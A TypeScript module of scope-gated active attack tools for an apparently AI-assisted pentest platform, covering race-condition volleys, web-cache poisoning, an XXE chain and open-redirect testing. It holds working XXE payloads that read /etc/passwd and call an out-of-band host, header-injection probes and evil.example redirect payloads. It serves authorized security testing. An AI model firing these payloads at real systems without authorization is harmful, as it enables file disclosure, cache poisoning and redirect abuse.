// Tier-1 active attack tools for authorized targets (lab / active engagement /
// PENTEST_LAB_TARGETS). Every function is scope-gated via targetAllowed, bounded,
// low-rate, and reports HONEST signals (a signal is never claimed as a confirmed
// vulnerability). Pure classifiers are exported for unit tests.
import { targetAllowed, politeDelay } from "./security";
import { recordHttp } from "./httpHistory";
import { sessionHeaders } from "./httpSession";

const UA = "mia-assistant/1.0";

type ProbeResult = { status: number; body: string; headers: Record<string, string>; ms: number; error?: string };

function lowerHeaders(h: Headers): Record<string, string> {
  const out: Record<string, string> = {};
  h.forEach((v, k) => { out[k.toLowerCase()] = v; });
  return out;
}

async function fetchProbe(url: string, opts: { method?: string; headers?: Record<string, string>; body?: string; session?: string; rawUser?: unknown } = {}): Promise<ProbeResult> {
  const method = (opts.method || "GET").toUpperCase();
  const headers: Record<string, string> = { "User-Agent": UA };
  if (opts.session && opts.rawUser) {
    const s = sessionHeaders(opts.rawUser, opts.session);
    if (s) {
      Object.assign(headers, s.headers);
      if (s.cookie && !Object.keys(headers).some((k) => k.toLowerCase() === "cookie")) headers["cookie"] = s.cookie;
    }
  }
  Object.assign(headers, opts.headers || {});
  const t0 = Date.now();
  try {
    const res = await fetch(url, { method, headers, body: method === "GET" || method === "HEAD" ? undefined : opts.body, redirect: "manual", signal: AbortSignal.timeout(12_000) });
    const body = (await res.text()).slice(0, 12_000);
    return { status: res.status, body, headers: lowerHeaders(res.headers), ms: Date.now() - t0 };
  } catch (e) {
    return { status: 0, body: "", headers: {}, ms: Date.now() - t0, error: e instanceof Error ? e.message : String(e) };
  }
}

// ── race_attack (pro) ───────────────────────────────────────────────────────

export type RaceResult = { status: number; len: number; digest: string };

/**
 * Classify one race volley against its baseline. Pure — unit-tested.
 * Flags: all-success (no idempotency guard), mixed outcomes (non-deterministic
 * handler), unique-nonce all-success (duplicate creation).
 */
export function raceClassify(count: number, results: RaceResult[], uniqueNonce: boolean): string[] {
  const flags: string[] = [];
  const ok = results.filter((r) => r.status >= 200 && r.status < 300).length;
  const outcomes = new Set(results.map((r) => `${r.status}|${r.digest}`));
  if (results.some((r) => r.status === 0)) flags.push(`❌ ${results.filter((r) => r.status === 0).length} request gagal (network) — hasil tidak bisa dinilai penuh.`);
  if (ok === count && count >= 3) flags.push(uniqueNonce
    ? `⚠️ ${ok}/${count} request UNIK semuanya sukses → indikasi kuat duplicate-creation (tanpa dedup idempotency). Verifikasi efek nyata (jumlah record/balance).`
    : `⚠️ Semua ${count} request sukses (2xx) → tidak ada proteksi race/idempotency yang terlihat. Uji efek nyata (double-spend/kuota).`);
  if (outcomes.size > 1) flags.push(`⚠️ ${outcomes.size} outcome berbeda → handler tidak deterministik (race/TOCTOU signal).`);
  return flags;
}

/**
 * Race-condition prober. `nonce` supports a `{{NONCE}}` placeholder in `url`
 * and/or `body` — each concurrent request gets a unique value, turning the
 * volley into a duplicate-creation probe (coupons, withdrawals, registrations).
 * Count capped at 30 (anti-DoS).
 */
export async function raceAttackPro(rawUser: unknown, opts: { url: string; method?: string; body?: string; headers?: Record<string, string>; count?: number; nonce?: boolean; session?: string }): Promise<string> {
  const u0 = (opts.url || "").trim();
  if (!/^https?:\/\//i.test(u0)) return "Error: URL harus http(s).";
  if (!targetAllowed(u0)) return "Error: SCOPE — race_attack hanya untuk lab / engagement aktif / PENTEST_LAB_TARGETS.";
  const method = (opts.method || "POST").toUpperCase();
  const count = Math.min(30, Math.max(2, Number(opts.count) || 10));
  const nonce = opts.nonce !== false;
  const sendOne = async () => {
    let url = u0;
    let body = opts.body;
    if (nonce) {
      const v = Math.random().toString(36).slice(2, 12);
      url = url.replace(/\{\{NONCE\}\}/g, v);
      if (body) body = body.replace(/\{\{NONCE\}\}/g, v);
    }
    const r = await fetchProbe(url, { method, body, headers: opts.headers, session: opts.session, rawUser });
    return { status: r.status, len: r.body.length, digest: r.status === 0 ? "err" : r.body.slice(0, 500) } as RaceResult;
  };
  await politeDelay();
  const baseline = await sendOne();
  recordHttp(rawUser, { method, url: u0, status: baseline.status, bytes: baseline.len, ms: 0, at: new Date().toISOString() });
  const results = await Promise.all(Array.from({ length: count }, () => sendOne()));
  const ok = results.filter((r) => r.status >= 200 && r.status < 300).length;
  const outcomes = new Map<string, number>();
  for (const r of results) outcomes.set(`${r.status}|${r.digest.slice(0, 24)}`, (outcomes.get(`${r.status}|${r.digest.slice(0, 24)}`) || 0) + 1);
  const dist = [...outcomes.entries()].sort((a, b) => b[1] - a[1]).map(([k, n]) => `${k} ×${n}`).join(", ");
  const flags = raceClassify(count, results, nonce);
  const head = `🏁 RACE ATTACK ${method} ${u0} — ${count} request paralel${nonce ? " (nonce unik/request)" : ""}; baseline ${baseline.status}/${baseline.len}b; sukses ${ok}/${count}.`;
  return `${head}\nDistribusi: ${dist}${flags.length ? `\n${flags.join("\n")}` : "\nTidak ada indikasi race (respons seragam)." }\n\n⚠️ Sinyal ≠ exploit. Bukti harus efek nyata (record duplikat/saldo) — poc_verify sebelum finding_add. Jangan jadikan DoS.`;
}

// ── cache_poison_prover ─────────────────────────────────────────────────────

const CACHE_HEADERS = ["x-cache", "age", "cf-cache-status", "x-varnish", "x-drupal-cache", "x-magento-cache-debug", "x-vercel-cache", "x-served-by", "x-fastly-request-id", "x-cache-hits"];

/** Pure classifier for one cache-poison probe response. Unit-tested. */
export function cacheProbeSignals(base: ProbeResult, probe: ProbeResult, marker: string): string[] {
  const out: string[] = [];
  if (probe.error || probe.status === 0) return out;
  const cacheable = CACHE_HEADERS.some((h) => probe.headers[h] !== undefined);
  if (cacheable) out.push(`cacheable (header cache: ${CACHE_HEADERS.filter((h) => probe.headers[h] !== undefined).join(",")})`);
  if (probe.body.includes(marker)) out.push("marker TERPANTUL di body respons");
  if (probe.headers.location && probe.headers.location.includes(marker)) out.push(`marker di Location: ${probe.headers.location.slice(0, 120)}`);
  for (const [k, v] of Object.entries(probe.headers)) {
    if (k !== "location" && v.includes(marker)) out.push(`marker di header ${k}`);
  }
  if (probe.status !== base.status) out.push(`status berubah ${base.status}→${probe.status}`);
  return out;
}

/**
 * Web-cache poisoning prover: header injection matrix (X-Forwarded-Host,
 * X-Original-URL, …), fat-GET, dan refleksi param. `callback` (OAST URL) makes
 * the marker verifiable OOB; tanpa callback dipakai marker unik untuk cek
 * pantulan. Reflect + cacheable = kandidat kuat (bukti penuh: re-fetch tanpa
 * header menunjukkan konten terpoison).
 */
export async function cachePoisonProver(rawUser: unknown, opts: { url: string; callback?: string; params?: string[]; session?: string }): Promise<string> {
  const u = (opts.url || "").trim();
  if (!/^https?:\/\//i.test(u)) return "Error: URL harus http(s).";
  if (!targetAllowed(u)) return "Error: SCOPE — cache_poison_prover hanya untuk lab / engagement aktif / PENTEST_LAB_TARGETS.";
  const marker = opts.callback ? opts.callback.replace(/^https?:\/\//, "").split("/")[0] : `mia${Math.random().toString(36).slice(2, 10)}.example.com`;
  await politeDelay();
  const base = await fetchProbe(u, { session: opts.session, rawUser });

  const headerProbes: [string, string][] = [
    ["x-forwarded-host", marker],
    ["x-host", marker],
    ["x-forwarded-scheme", "nothttps"],
    ["x-forwarded-port", "1337"],
    ["x-original-url", "/mia-poison-probe"],
    ["x-rewrite-url", "/mia-poison-probe"],
  ];
  const lines: { name: string; signals: string[] }[] = [];
  for (const [h, v] of headerProbes) {
    const p = await fetchProbe(u, { headers: { [h]: v }, session: opts.session, rawUser });
    const s = cacheProbeSignals(base, p, v);
    if (s.length) lines.push({ name: `${h}: ${v}`, signals: s });
  }
  // Fat GET (method-override variant): a GET carrying an entity body. Node fetch
  // THROWS on GET+body, so send POST + X-HTTP-Method-Override: GET — front ends
  // that honor the override expose the same cache-key confusion.
  const fat = await fetchProbe(u, { method: "POST", body: "mia=1", headers: { "content-type": "application/x-www-form-urlencoded", "x-http-method-override": "GET" }, session: opts.session, rawUser });
  const fatS = cacheProbeSignals(base, fat, "mia=1");
  if (fatS.length) lines.push({ name: "fat GET (POST + X-HTTP-Method-Override: GET)", signals: fatS });

  // Param reflection (classic web-cache-poisoning params).
  const params = (opts.params && opts.params.length ? opts.params : ["utm_content", "utm_source", "callback", "next", "redirect", "url"]).slice(0, 6);
  try {
    const urlObj = new URL(u);
    for (const p of params) {
      const pm = `mia${Math.random().toString(36).slice(2, 8)}`;
      urlObj.searchParams.set(p, pm);
      const pr = await fetchProbe(urlObj.toString(), { session: opts.session, rawUser });
      const s = cacheProbeSignals(base, pr, pm);
      if (s.length) lines.push({ name: `?${p}=${pm}`, signals: s });
    }
  } catch { /* url guard already done */ }

  const head = `🧯 CACHE POISON ${u} — baseline ${base.status}/${base.body.length}b, ${lines.length} probe bermasalah.`;
  if (!lines.length) return `${head}\nTidak ada refleksi/indikasi cache-key manipulation (header matrix + fat GET + param).`;
  const strong = lines.some((l) => l.signals.some((s) => /TERPANTUL|Location|header /.test(s)) && lines.some((x) => x.signals.some((y) => /cacheable/i.test(y))));
  const body = lines.map((l) => `• ${l.name}\n   ↳ ${l.signals.join("; ")}`).join("\n");
  const verdict = strong
    ? "🔥 STRONG: pantulan + cacheable — re-fetch URL TANPA header; kalau konten terpoison tetap muncul → temuan terbukti (web cache poisoning)."
    : opts.callback
      ? "Pantulan terlihat. Untuk bukti penuh: re-fetch tanpa header, dan cek `oast_poll` untuk interaksi callback."
      : "Pantulan terlihat tapi tidak ada header cache eksplisit — bisa saja cached downstream. Lanjutkan uji dengan re-fetch + OAST callback.";
  return `${head}\n${body}\n\n${verdict}\n\n⚠️ Verifikasi manual + poc_verify sebelum finding_add.`;
}

// ── xxe_chain ───────────────────────────────────────────────────────────────

export type XxePayload = { name: string; decl: string; ref: string; selfClosing?: boolean };

/** Payload set untuk XXE (file-read inline, OOB entity, param-entity, PHP filter). Pure. */
export function xxePayloads(callback: string): XxePayload[] {
  return [
    { name: "file-read inline (/etc/passwd)", decl: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`, ref: "&xxe;" },
    { name: `OOB entity → ${callback}`, decl: `<!ENTITY xxe SYSTEM "${callback}/oob">`, ref: "&xxe;" },
    { name: `param-entity OOB → ${callback}`, decl: `<!ENTITY % remote SYSTEM "${callback}/param">`, ref: "%remote;", selfClosing: true },
    { name: "PHP filter read", decl: `<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">`, ref: "&xxe;" },
  ];
}

/** Build one XML document for a payload. Pure. */
export function buildXxeDoc(p: XxePayload, bodyTemplate?: string): string {
  if (bodyTemplate && bodyTemplate.includes("{XXE}")) {
    return bodyTemplate.replace("{XXE}", `${p.decl}${p.ref}`);
  }
  if (p.selfClosing) return `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE r [${p.decl}${p.ref}]><r/>`;
  return `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE r [${p.decl}]><r><d>${p.ref}</d></r>`;
}

/** Signal classifier for one XXE response. Pure. */
export function xxeSignals(p: ProbeResult): string[] {
  const out: string[] = [];
  if (p.error || p.status === 0) return out;
  if (/root:.*:[0-9]+:[0-9]+:/.test(p.body)) out.push("🔥 /etc/passwd TERBACA (file-read terbukti)");
  if (/not matched|referenced but not|undeclared entity|The entity/i.test(p.body)) out.push("XML ter-parse (entitas diproses) — parser XML aktif");
  if (/base64|<\?xml/i.test(p.body) && /php:\/\//i.test(p.body) === false && p.status === 200 && /cm9vdA|root/.test(p.body)) out.push("base64 content muncul (PHP filter read kandidat)");
  if (p.status !== 0 && p.status !== 200) out.push(`status ${p.status}`);
  return out;
}

/**
 * XXE chain: auto-OAST → 4 payload → kirim → klasifikasi sinyal → oast_poll
 * untuk bukti OOB. Scope-gated.
 */
export async function xxeChain(rawUser: unknown, opts: { url: string; method?: string; body_template?: string; content_type?: string; callback?: string; session?: string }): Promise<string> {
  const u = (opts.url || "").trim();
  if (!/^https?:\/\//i.test(u)) return "Error: URL harus http(s).";
  if (!targetAllowed(u)) return "Error: SCOPE — xxe_chain hanya untuk lab / engagement aktif / PENTEST_LAB_TARGETS.";
  let callback = (opts.callback || "").trim();
  let oastNote = "";
  if (!callback) {
    const { oastCreate } = await import("./oast");
    const created = await oastCreate(rawUser);
    const m = created.match(/https:\/\/webhook\.site\/[0-9a-f-]+/i);
    if (!m) return `Error: gagal auto-create OAST (${created.slice(0, 120)}). Isi arg \`callback\` manual.`;
    callback = m[0];
    oastNote = "(OAST auto-create)";
  }
  const method = (opts.method || "POST").toUpperCase();
  const payloads = xxePayloads(callback);
  const ct = opts.content_type || "application/xml";
  const lines: string[] = [];
  for (const p of payloads) {
    const doc = buildXxeDoc(p, opts.body_template);
    const r = await fetchProbe(u, { method, body: doc, headers: { "content-type": ct }, session: opts.session, rawUser });
    recordHttp(rawUser, { method, url: u, status: r.status, bytes: r.body.length, ms: r.ms, at: new Date().toISOString() });
    const s = xxeSignals(r);
    lines.push(`• ${p.name}${s.length ? `\n   ↳ ${s.join("; ")}${s.some((x) => x.includes("TERBACA")) ? `\n   ↳ ${r.body.slice(0, 200).replace(/\s+/g, " ")}` : ""}` : " — tanpa sinyal"}`);
    await politeDelay();
  }
  const { oastPoll } = await import("./oast");
  const poll = await oastPoll(rawUser);
  const oob = /belum ada interaksi/.test(poll) ? "OOB: belum ada interaksi callback." : `OOB: ${poll.split("\n").slice(0, 4).join(" | ").slice(0, 300)}`;
  return `🧬 XXE CHAIN ${method} ${u} — callback ${callback} ${oastNote}\n${lines.join("\n")}\n\n${oob}\n\n⚠️ File-read/OOB yang terbukti → poc_verify (determinisme) → finding_add. Tanpa sinyal: coba endpoint XML lain / payload CDNA wrapper (body_template).`;
}

// ── open_redirect_chain ─────────────────────────────────────────────────────

export const REDIRECT_PAYLOADS = [
  "https://evil.example/",
  "//evil.example/",
  "https:evil.example",
  "/\\evil.example",
  "https://trusted.example@evil.example/",
  "https://evil.example.trusted.example/",
  "https://evil.example%2f..%2f",
  "https://evil.example#.trusted.example",
];

export const REDIRECT_PARAMS = ["redirect", "url", "next", "return", "returnTo", "return_to", "continue", "dest", "destination", "target", "rurl", "callback", "redirect_uri", "forward", "go", "link", "ref", "u", "out"];

/** Host of a URL string (empty when unparseable). Pure. */
function hostOf(u: string): string {
  try { return new URL(u).host.toLowerCase(); } catch { return ""; }
}

/**
 * Pure verdict for one redirect probe. Unit-tested. Host-based: the Location must
 * actually NAVIGATE to an attacker-controlled host — an echo of the payload as a
 * query param (`https://target.com/?next=https://evil.example/`) is NOT a redirect
 * and must stay "none". Handles scheme-less (`//evil.example/`), userinfo
 * (`https://trusted@evil.example/`), and %2f-encoded payloads.
 */
export function redirectVerdict(payload: string, loc: string): "external-redirect" | "reflected" | "none" {
  const l = (loc || "").trim();
  if (!l) return "none";
  let lDecoded = l;
  try { lDecoded = decodeURIComponent(l); } catch { /* keep raw */ }
  const afterProto = payload.replace(/^[a-z][a-z0-9+.-]*:\/\//i, "");
  const candidates = new Set<string>();
  const addHost = (cand: string) => {
    // strip scheme-relative slashes, cut at %2f (browser-decoded path separator)
    const c = cand.replace(/^\/+/, "").split(/%2f/i)[0];
    if (!c) return;
    const h = hostOf(`http://${c}`) || c.toLowerCase();
    if (h) candidates.add(h);
  };
  const first = afterProto.split(/[/?#]/)[0];
  addHost(first || afterProto);
  const userinfo = afterProto.includes("@") ? afterProto.split("@").pop()! : "";
  if (userinfo) addHost(userinfo.split(/[/?#]/)[0]);
  // Resolve the Location with a throwaway base so protocol-relative (//host/x)
  // and relative forms yield a host too.
  const locHost = hostOf(l) || hostOf(lDecoded) || hostOf(new URL(l, "http://mia.placeholder").toString()) || hostOf(new URL(lDecoded, "http://mia.placeholder").toString());
  if (locHost && candidates.has(locHost)) return "external-redirect";
  // Relative/scheme-less Locations: only a PREFIX may count (never a contains —
  // that would flag payload echoes inside query strings).
  for (const raw of [l, lDecoded]) {
    const noProto = raw.replace(/^[a-z][a-z0-9+.-]*:\/\//i, "").toLowerCase();
    const clean = noProto.replace(/%2f/gi, "");
    for (const h of candidates) {
      if (noProto.startsWith(`//${h}`) || noProto.startsWith(h) || clean.startsWith(`//${h}`) || clean.startsWith(h)) return "external-redirect";
    }
  }
  return "none";
}

/**
 * Open-redirect chain: param × payload matrix (bounded), server-side Location
 * verdict + client-side reflection flag, optional OOB callback + session token
 * leak check. Confirmed external redirect = temuan siap poc_verify.
 */
export async function openRedirectChain(rawUser: unknown, opts: { url: string; params?: string[]; callback?: string; session?: string; method?: string; body?: string }): Promise<string> {
  const u0 = (opts.url || "").trim();
  if (!/^https?:\/\//i.test(u0)) return "Error: URL harus http(s).";
  if (!targetAllowed(u0)) return "Error: SCOPE — open_redirect_chain hanya untuk lab / engagement aktif / PENTEST_LAB_TARGETS.";
  let base: URL;
  try { base = new URL(u0); } catch { return "Error: URL tidak valid."; }
  const method = (opts.method || "GET").toUpperCase();
  const params = (opts.params && opts.params.length ? opts.params : [...base.searchParams.keys(), ...REDIRECT_PARAMS].filter(Boolean)).slice(0, 8);
  const payloads = REDIRECT_PAYLOADS.slice(0, 8);
  await politeDelay();
  const confirmed: string[] = [];
  const reflected: string[] = [];
  let reqCount = 0;
  for (const param of params) {
    for (const payload of payloads) {
      if (reqCount >= 40) break;
      const u = new URL(base.toString());
      u.searchParams.set(param, payload);
      const r = await fetchProbe(u.toString(), { method, body: opts.body, session: opts.session, rawUser });
      reqCount++;
      if (r.status === 0) continue;
      const loc = r.headers.location || "";
      const v = redirectVerdict(payload, loc);
      if (v === "external-redirect") {
        confirmed.push(`?${param}=${payload} → Location: ${loc.slice(0, 120)} (status ${r.status})`);
        break; // one confirmed payload per param is enough — don't spray the rest
      }
      if (r.body.includes(payload)) reflected.push(`?${param} — payload terpantul di body (client-side redirect kandidat)`);
      await politeDelay();
    }
    if (reqCount >= 40) break;
  }
  let oob = "";
  if (opts.callback && (confirmed.length || reflected.length)) {
    const { oastPoll } = await import("./oast");
    const poll = await oastPoll(rawUser);
    oob = /belum ada interaksi/.test(poll) ? "" : `\n🎣 OOB: ${poll.split("\n").slice(0, 3).join(" | ").slice(0, 250)}`;
  }
  const head = `↪️ OPEN REDIRECT ${base.origin}${base.pathname} — ${reqCount} request (${params.length} param × ${payloads.length} payload).`;
  const parts = [head];
  if (confirmed.length) parts.push(`✅ REDIRECT EKSTERNAL TERKONFIRMASI (${confirmed.length}):\n${confirmed.slice(0, 8).map((c) => "• " + c).join("\n")}`);
  if (reflected.length) parts.push(`ℹ️ Refleksi (client-side, perlu cek JS):\n${[...new Set(reflected)].slice(0, 5).map((c) => "• " + c).join("\n")}`);
  if (!confirmed.length && !reflected.length) parts.push("Tidak ada redirect eksternal / refleksi.");
  parts.push(`${oob}\n⚠️ Redirect terkonfirmasi → poc_verify (payload → Location 30x deterministik) → finding_add. Kalau ada token/sesi di URL redirect → naikkan ke token-leak.`);
  return parts.join("\n");
}
